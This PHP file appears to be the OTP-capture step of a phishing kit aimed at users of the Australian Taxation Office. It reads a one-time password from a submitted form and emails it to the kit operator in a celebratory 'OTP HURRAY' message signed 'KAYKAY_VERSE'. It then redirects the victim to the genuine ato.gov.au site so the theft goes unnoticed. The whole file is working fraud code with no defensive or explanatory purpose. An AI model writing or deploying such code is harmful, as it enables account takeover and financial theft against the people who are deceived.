<?php

if (isset($_POST["submit"])){
    $usercode = $_POST["otpcode"];
    

    $subject = "HELLO REMINDER ON OUR BIRTHDAY VERSE";
    $msg = "
    <html>
    <head><meta charset='UTF-8'></head>
    <div style='font-size: 13px;font-family:monospace;font-weight:700;'>
    ------------------ <font style='color: #820000;'>MY BRODY WE GONE MAKE IT</font> ------------------<br/>
    -_-_-_-_-_-_-_-_-[ <font style='color: #0a5d00;'>OTP HURRAY</font> ]-_-_-_-_-_-_-_-_-<br>
    <font style='color:#9c0000;'>😈</font> [OTP CODE]   = <font style='color:#0070ba;'>".$usercode."</font><br>
    
   
    
    ------------------ <font style='color: #820000;'>BY KAYKAY_VERSE</font> ------------------</div></html>\n";



    require_once 'Email.php';
    require_once 'function.inc.php';


    // if (emptyInput($username, $password) !== false){
    //     header("location: ../code.php?error=emptyinput");
    //     exit();
    // }

    sendmail($kaykayemail, $subject, $msg);
    header("location: https://www.ato.gov.au/");

}
else{
    header("location: ../code.php?error");
    
}